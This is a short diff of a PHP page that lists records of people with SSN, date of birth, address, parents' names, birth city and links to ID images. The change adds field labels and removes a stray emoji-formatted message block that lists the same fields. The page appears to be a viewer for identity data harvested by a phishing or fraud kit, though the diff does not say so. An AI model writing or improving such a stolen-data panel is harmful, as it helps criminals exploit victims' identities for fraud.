@@ -61,26 +61,14 @@ foreach ($data as $row) {
     <div style='border:1px solid #ccc;padding:15px;margin:10px;border-radius:10px;'>
         <h3>{$row['first_name']} {$row['middle_name']} {$row['last_name']}</h3>
         <p>🧾 SSN: {$row['ssn']}</p>
-        <p>📞 {$row['phone']}</p>
-        <p>📧 {$row['email']}</p>
-        <p>🎂 {$row['dob']}</p>
-        <p>🏠 {$row['address']}</p>
-        <p>🏙 {$row['birth_city']}</p>
-        <p>👨 {$row['father_name']}</p>
-        <p>👩 {$row['mother_name']}</p>
+        <p>📞 PHONE: {$row['phone']}</p>
+        <p>📧 EMAIL: {$row['email']}</p>
+        <p>🎂 DOB: {$row['dob']}</p>
+        <p>🏠 ADDRESS: {$row['address']}</p>
+        <p>🏙 BIRTH CITY: {$row['birth_city']}</p>
+        <p>👨 FATHER NAME: {$row['father_name']}</p>
+        <p>👩 MOTHER NAME: {$row['mother_name']}</p>
         
-
-. "👤 Name: $first_name $middle_name $last_name\n"
-. "📞 Phone: $phone\n"
-. "📧 Email: $email\n"
-. "🎂 DOB: $dob\n"
-. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
-. "🏙 Birth City: $birth_city\n"
-. "👨 Father: $father_name\n"
-. "👩 Mother: $mother_name\n"
-. "🧾 SSN: $ssn";
-
-
         <p>
             🪪 Front ID:
             <a href='{$row['front_id']}' target='_blank'>View</a>
